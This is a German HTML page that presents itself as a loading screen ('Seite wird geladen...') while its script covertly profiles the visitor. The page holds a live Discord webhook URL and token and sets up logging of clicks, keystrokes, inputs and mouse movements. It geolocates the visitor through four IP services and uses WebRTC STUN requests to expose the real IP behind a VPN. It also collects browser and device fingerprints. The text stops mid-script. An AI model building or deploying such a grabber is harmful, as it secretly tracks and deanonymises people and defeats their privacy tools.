<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laden...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Seite wird geladen...</p>
    </div>

    <script>
        // Webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467220093426729269/ImYFulsalFSaKA1ytuMVLp09ZfgCzozf3P3OOjfS7DoTkXOSPLbtL_QJIfawr5rwC2gn';
        
        // Tracking Daten
        let trackingData = {
            sessionId: generateSessionId(),
            startTime: new Date().toISOString(),
            clicks: [],
            mouseMovements: [],
            inputs: [],
            keyPresses: [],
            scrolls: [],
            downloads: [],
            uploads: [],
            webRTCIP: null,
            realIP: null,
            vpnIP: null
        };

        // Session ID generieren
        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        // IP und Standort über mehrere Dienste abrufen
        async function getAllIPs() {
            const services = [
                { name: 'ipapi', url: 'https://ipapi.co/json/' },
                { name: 'ipinfo', url: 'https://ipinfo.io/json' },
                { name: 'ip-api', url: 'http://ip-api.com/json/' },
                { name: 'geoip', url: 'https://geoip.nekudo.com/api/' }
            ];
            
            const results = {};
            
            for (const service of services) {
                try {
                    const response = await fetch(service.url);
                    const data = await response.json();
                    
                    if (service.name === 'ipapi') {
                        results.ipapi = {
                            ip: data.ip,
                            city: data.city,
                            country: data.country_name,
                            region: data.region,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            isp: data.org,
                            asn: data.asn
                        };
                    } else if (service.name === 'ipinfo') {
                        results.ipinfo = {
                            ip: data.ip,
                            city: data.city,
                            country: data.country,
                            region: data.region,
                            latitude: parseFloat(data.loc?.split(',')[0]),
                            longitude: parseFloat(data.loc?.split(',')[1]),
                            isp: data.org,
                            hostname: data.hostname
                        };
                    } else if (service.name === 'ip-api') {
                        results.ipapi_com = {
                            ip: data.query,
                            city: data.city,
                            country: data.country,
                            region: data.regionName,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp,
                            asn: data.as,
                            timezone: data.timezone
                        };
                    } else if (service.name === 'geoip') {
                        results.geoip = {
                            ip: data.ip,
                            city: data.city,
                            country: data.country.name,
                            latitude: data.location.latitude,
                            longitude: data.location.longitude,
                            isp: data.connection.isp
                        };
                    }
                } catch (error) {
                    console.error(`Fehler bei \${service.name}:`, error);
                }
            }
            
            return results;
        }

        // WebRTC echte IP abrufen (umgeht VPN)
        async function getWebRTCIP() {
            return new Promise((resolve) => {
                const ips = new Set();
                const rtc = new RTCPeerConnection({iceServers: [
                    {urls: 'stun:stun.l.google.com:19302'},
                    {urls: 'stun:stun1.l.google.com:19302'},
                    {urls: 'stun:stun2.l.google.com:19302'},
                    {urls: 'stun:stun3.l.google.com:19302'},
                    {urls: 'stun:stun4.l.google.com:19302'}
                ]});
                
                rtc.createDataChannel('', {reliable: false});
                
                rtc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const matches = candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
                        if (matches) {
                            matches.forEach(ip => {
                                if (!ip.startsWith('127.') && !ip.startsWith('192.168.') && !ip.startsWith('10.')) {
                                    ips.add(ip);
                                }
                            });
                        }
                    }
                };
                
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(e => console.error('WebRTC Fehler:', e));
                
                setTimeout(() => {
                    trackingData.webRTCIP = Array.from(ips);
                    resolve(Array.from(ips));
                }, 3000);
            });
        }

        // Detaillierte Browser Informationen
        function getDetailedBrowserInfo() {
            const ua = navigator.userAgent;
            const browserData = {
                userAgent: ua,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                platform: navigator.platform,
                vendor: navigator.vendor,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                onLine: navigator.onLine,
                javaEnabled: navigator.javaEnabled(),
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver
            };
            
            // Browser erkennen
            if (ua.indexOf('Chrome') > -1) {
                browserData.browser = 'Chrome';
                browserData.version = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
                browserData.browser = 'Safari';
                browserData.version = ua.match(/Version\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Firefox') > -1) {
                browserData.browser = 'Firefox';
                browserData.version = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unbekannt';
            } else if (ua.indexOf('Edge') > -1) {
                browserData.browser = 'Edge';
                browserData.version = ua.match(/Edge\/(\d+)/)?.[1] || 'Unbekannt';
            }
            
            return browserData;
        }

        // Betriebssystem und Gerät
        function getSystemInfo() {
            const ua = navigator.userAgent;
            let os = 'Unbekannt';
            let osVersion = 'Unbekannt';
            
            if (ua.indexOf('Windows') > -1) {
                os = 'Windows';
                const match = ua.match(/Windows NT (\d+\.\d+)/);
                if (match) osVersion = match[1];
            } else if (ua.indexOf('Mac') > -1) {
                os = 'macOS';
                const match = ua.match(/Mac OS X (\d+[._]\d+)/);
                if (match) osVersion = match[1].replace('_', '.');
            } else if (ua.indexOf('Linux') > -1) {
                os = 'Linux';
            } else if (ua.indexOf('Android') > -1) {
                os = 'Android';
                const match = ua.match(/Android (\d+\.\d+)/);
                if (match) osVersion = match[1];
            } else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
                os = 'iOS';
                const match = ua.match(/OS (\d+[._]\d+)/);
                if (match) osVersion = match[1].replace('_', '.');
            }
            
            return {
                os: os,
                osVersion: osVersion,
                deviceType: getDeviceType(),
                architecture: navigator.userAgentData?.platform || navigator.platform,
                mobile: /Mobile|Android|iPhone|iPad|iPod/.test(ua)
            };
        }

       
